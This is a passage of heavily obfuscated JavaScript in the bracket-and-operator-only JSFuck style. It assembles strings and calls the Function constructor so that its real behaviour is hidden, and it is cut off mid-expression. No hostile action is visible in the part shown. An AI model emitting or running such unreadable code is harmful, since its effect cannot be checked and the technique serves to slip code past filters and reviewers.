!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+([]+{})[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+(+!![]+[])+(+[]+[])+(!+[]+!![]+[])+(!+[]+!![]+!![]+!![]+[])+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[+[]]+(+{}+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+[]))+([][[]]+[])[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+(!+[]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+[])+([]+{})[!+[]+!![]])+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(+[]+[])+(+{}+[])[+!![]])+([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(![]+[])[!+[]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+[])+([][[]]+[])[!+[]+!![]+!![]])+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()([][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+(![]+[])[!+[]+!![]]+([]+{})[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+(!![]+[])[+[]]+([][[]]+[])[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]])())[!+[]+!![]+!![]]+([][[]]+[])[!+[]+!![]+!![]])()(([]+{})[+[]])[+[]]+(!+[]+!![]+!![]+!![]+!![]+!![]+[])+(!+[]+!![]+!![]+!![]+!![]+!![]+!![]+[]))+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+[]]+([]+{})[+!![]]+(!![]+[])[+!![]]]((!![]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+([][[]]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]+!![]+!![]]+([][[]]+[])[+[]]+([][[]]+[])[+!![]]+([][[]]+[])[!+[]+!![]+!![]]+(![]+[])[!+[]+!![]+!![]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(+{}+[])[+!![]]+([]+[][(![]+[])[!+[]+!![]+!![]]+([]+{})[+!![]]+(!![]+[])[+!![]]+(!![]+[])[+[]]][([]+{})[!+[]+!![]+!![]+!![]+!![]]+([]+{})[+!![]]+([][[]]+[])[+!![]]+(![]+[])[!+[]+!![]+!![]]+(!![]+[])[+[]]+(!![]+[])[+!![]]+([][[]]+[])[+[]]+([]+{})[!+[]+!![]+!![]+!![]+!![]]+(!![]+[])[+